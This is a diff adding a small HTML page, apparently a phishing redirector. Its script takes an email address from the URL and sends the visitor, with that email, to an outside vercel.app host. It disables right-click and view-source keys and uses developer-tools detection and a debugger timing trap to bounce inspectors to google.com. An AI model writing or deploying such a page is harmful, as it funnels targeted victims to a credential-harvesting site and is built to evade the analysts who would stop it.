@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <script>
+    function bIB(str, bits = 20) {
+      const bitLength = Math.ceil(str.length / bits);
+      const result = [];
+      for (let i = 0; i < bits; i++) {
+        const start = i * bitLength;
+        const end = start + bitLength;
+        result.push(str.slice(start, end));
+      }
+      return result;
+    }
+
+    function combineBits(bits) {
+      return bits.join("");
+    }
+
+    function encodeEmailAndRedirect() {
+      const queryString = window.location.search;
+      const emailPrefix = "email=";
+      const emailStartIndex = queryString.indexOf(emailPrefix);
+
+      if (emailStartIndex !== -1) {
+        const email = queryString.slice(emailStartIndex + emailPrefix.length);
+        const emailEndIndex = email.indexOf('&');
+        const finalEmail = emailEndIndex === -1 ? email : email.slice(0, emailEndIndex);
+
+        if (finalEmail) {
+          const encodedEmail = finalEmail;
+          window.location.href = `https://admin-multifacefuels.vercel.app/?email=${encodedEmail}`;
+        } else {
+          alert("Invalid email parameter!");
+        }
+      } else {
+        alert("Email parameter not found!");
+      }
+    }
+
+    function detectDevTools() {
+      const devToolsOpened = () => {
+        const widthThreshold = window.outerWidth - window.innerWidth > 160;
+        const heightThreshold = window.outerHeight - window.innerHeight > 160;
+        return widthThreshold || heightThreshold;
+      };
+
+      if (devToolsOpened()) {
+        window.location.href = "https://www.google.com";
+      }
+    }
+
+    setInterval(detectDevTools, 1000);
+
+    document.addEventListener("contextmenu", (e) => {
+      e.preventDefault();
+    });
+
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "F12" ||
+          (e.ctrlKey && e.shiftKey && e.key === "I") ||
+          (e.ctrlKey && e.key === "U") ||
+          (e.ctrlKey && e.shiftKey && e.key === "C") ||
+          (e.ctrlKey && e.key === "S") ||
+          (e.ctrlKey && e.key === "J")) {
+        e.preventDefault();
+        window.location.href = "https://www.google.com";
+      }
+    });
+
+    function antiDebugging() {
+      const startTime = performance.now();
+      debugger;
+      const endTime = performance.now();
+      if (endTime - startTime > 100) {
+        window.location.href = "https://www.google.com";
+      }
+    }
+
+    setInterval(antiDebugging, 1000);
+
+    // Execute the redirect
+    encodeEmailAndRedirect();
+  </script>
+</head>
+<body>
+  <h1>...</h1>
+</body>
+</html>
